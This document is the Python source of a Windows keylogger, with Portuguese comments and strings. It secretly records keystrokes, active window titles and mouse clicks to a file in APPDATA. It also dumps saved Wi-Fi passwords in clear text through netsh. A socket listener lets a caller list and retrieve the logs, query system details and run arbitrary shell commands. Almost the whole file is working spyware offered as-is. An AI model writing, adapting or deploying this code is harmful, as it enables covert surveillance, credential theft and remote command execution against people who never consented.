from pynput import mouse
from pynput import keyboard
from screeninfo import get_monitors
import datetime
import os
import win32gui
import subprocess
import socket
import platform
import time

class KeyLogger():
    try:
        os.mkdir(os.getenv('APPDATA')+'/Logs')
    except:
        pass
    timeStamp = str(datetime.date.today()).replace('-','')
    def __init__(self, filename: str = os.getenv('APPDATA')+'/Logs/'+timeStamp+'.txt') -> None:
        self.filename = filename
        self.w2 = ''

    @staticmethod
    def get_monitors(self):
        with open(self.filename, 'a') as logs:
            for monitores in get_monitors():
                logs.write(str(monitores))

    def get_WiFi(self):
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile']) 
        data = meta_data.decode('utf-8', errors ="backslashreplace")
        data = data.split('\n') 
        perfis = []
        with open(self.filename, 'a') as logs:
            for i in data:
                if "All User Profile" in i :
                    i = i.split(":")
                    i = i[1]
                    i = i[1:-1]
                    perfis.append(i)
                if "Todos os Perfis" in i :
                    i = i.split(":")
                    i = i[1]
                    i = i[1:-1]
                    perfis.append(i)
            logs.write("\n{:<30}| {:<}".format("Nome do Wi-Fi (SSID)", "Senha"))
            logs.write("\n----------------------------------------------")
            for perfil in perfis:
                try:
                    registros = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', perfil, 'key=clear'])
                    registros = registros.decode('utf-8', errors ="backslashreplace")
                    registros = registros.split('\n')
                    senha = [b.split(":")[1][1:-1] for b in registros if "Key Content" in b]
                    if senha == []:
                        senha = [b.split(":")[1][1:-1] for b in registros if "da Chave" in b]
                    try:
                        logs.write("\n{:<30}| {:<}".format(perfil, senha[0]))
                    except IndexError:
                        logs.write("\n{:<30}| {:<}".format(perfil, ""))
                except subprocess.CalledProcessError:
                    print('Erro')
            logs.write("\n----------------------------------------------\n")
        return

    def get_char(self, key):
        try:
            if key.char != None:
                return key.char
            else:
                key = str(key)
                number = ''
                numpad = {
                    '<96>':  lambda number: '0',
                    '<97>':  lambda number: '1',
                    '<98>':  lambda number: '2',
                    '<99>':  lambda number: '3',
                    '<100>': lambda number: '4',
                    '<101>': lambda number: '5',
                    '<102>': lambda number: '6',
                    '<103>': lambda number: '7',
                    '<104>': lambda number: '8',
                    '<105>': lambda number: '9'
                    }
                return numpad[key](number)
        except AttributeError:
            key = str(key)
            special_Key = ''
            specials = {
                'Key.space': lambda special_Key: ' ',
                'Key.enter': lambda special_Key: '\n'
                }
            try:
                key = specials[key](special_Key)
            except:
                key = ''
            return key

    def on_press(self, key):
        with open(self.filename, 'a') as logs:
            try:
                logs.write(self.get_win_name())
            except:
                pass
            logs.write(self.get_char(key))

    def on_click(self, x, y, button, pressed):
        if pressed:
            with open(self.filename, 'a') as logs:
                logs.write('\nClick registrado em ({0}, {1}) usando {2}\n'.format(x, y, button))
            
    def get_win_name(self):
        window = win32gui
        self.w1 = window.GetWindowText(window.GetForegroundWindow())
        if self.w1 != self.w2:
            self.w2 = self.w1
            return '\n+- '+self.w2+' -+\n'
        else:
            return ''

    def main(self):
        escuta1 = keyboard.Listener(
            on_press = self.on_press,
        )
        escuta2 = mouse.Listener(
            on_click = self.on_click,
        )
        escuta1.start()
        escuta2.start()
        self.get_monitors(self)
        self.get_WiFi()

if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = 'localhost'
    port = 42424
    folder = os.getenv('APPDATA')+'/Logs/'
    server.bind((host, port))
    server.listen(5)
    while True:
        (client, ip) = server.accept()
        reply = ''
        try:
            command = client.recv(1024).decode()
        except:
            command = ''
        if command == '.list':
            try:
                reply = os.listdir(folder)
                client.send(str(reply).encode())
            except:
                client.send('Pasta não encontrada'.encode())
        if command == '.info':
            reply = []
            reply.append(platform.node())
            reply.append(platform.processor())
            reply.append(platform.system())
            reply.append(platform.release())
            client.send(str(reply).encode())
        if command.startswith('.cmd'):
            reply = command.replace('.cmd ','').split()
            reply = subprocess.Popen(reply, stdout=subprocess.PIPE)
            reply = str(reply.communicate()).encode()
            reply = reply.decode("unicode_escape")
            reply = reply.split('\n')
            for l in reply:
                time.sleep(0.025)
                client.send(l.encode())
        elif command.endswith('.txt'):
            with open(os.path.join(folder,command), "rb") as file:
                while True:
                    bytes_read = file.read(1024)
                    if not bytes_read:
                        break
                    client.sendall(bytes_read)
        else:
            pass
        client.close()